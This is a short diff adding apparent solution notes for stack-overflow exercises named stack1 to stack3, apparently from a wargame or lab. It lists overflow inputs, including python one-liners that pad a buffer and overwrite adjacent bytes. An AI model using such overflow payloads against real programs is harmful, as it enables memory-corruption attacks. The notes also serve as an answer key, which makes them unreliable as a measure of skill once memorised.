@@ -1,0 +1,9 @@
+solves:
+stack1
+aaaaaaaaaaaaaaaaaaaaaaaaa
+
+stack2
+ python -c "print 'Boon'+'\x00'*12+'Z'*4" | ./stack2
+
+stack3
+./stack3 $(python -c "print 'A' * 64 + '\x13\x13\x13\x13'")
